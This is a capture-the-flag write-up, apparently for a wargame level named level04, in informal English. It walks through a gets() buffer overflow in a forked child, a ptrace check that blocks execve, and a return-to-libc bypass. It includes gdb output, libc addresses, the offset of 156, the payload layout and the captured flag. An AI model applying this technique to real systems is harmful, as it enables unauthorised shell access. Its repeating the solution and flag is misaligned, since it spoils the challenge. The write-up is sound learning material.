the programm look create some child :
└─$ ./level04          
Give me some shellcode, k
a
child is exiting...



for follow the child with gdb i use :
(gdb) set follow-fork-mode child

so actually the problem is that buffer is only of size 128 and 
the child use a function gets and is not secure so is possible
to override the value of the tip addres

but the problem here is 
    do
    {
      wait(&stat_loc);
      v6 = stat_loc;
      if ( (stat_loc & 0x7F) == 0 || (v7 = stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
      {
        puts("child is exiting...");
        return 0;
      }
      v8 = ptrace(PTRACE_PEEKUSER, fork_value, 44, 0);
    }
    while ( v8 != 11 );
    puts("no exec() for you");
    kill(fork_value, 9);



that the parent is ptrace the child and look every time 
if the register of eax is content 11 is actullly the syscall



so i need a payload that not use syscall call

so the solution is to call something like not use syscall to swpan a shell


i use system because is libc element and note use syscall inside

system take one argument is on where is the program her is want /bin/bash or /bins/sh


info function system
0xf7e6aed0  system



so this addres for eip 

after i need the argument 
and the str is "/bin/sh"

so let's fins a adress with that 

(gdb) info proc mapping
process 6197
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec



and i found 0xf7f897ec for "/bin/sh"

now i need to thow how many offset before override eip
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search $eip
[+] Searching for '6f616162'/'6261616f' with period=4
[+] Found at offset 156 (little-endian search) likely
gef➤  



so 128octet before 

and because a call a function i need to stack looks like that :


[ESP + 0] -> adress of return
[ESP + 4] -> first argument
[ESP + 8] -> second argument



so the payload need to look like that :


padding 156 + addr of system + return addr + addr  "/bin/sh"




for the addres of return is not important but is possible to put anys addres like exit()

info function exit

0xf7e5eb70  exit

and found the flag !


3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN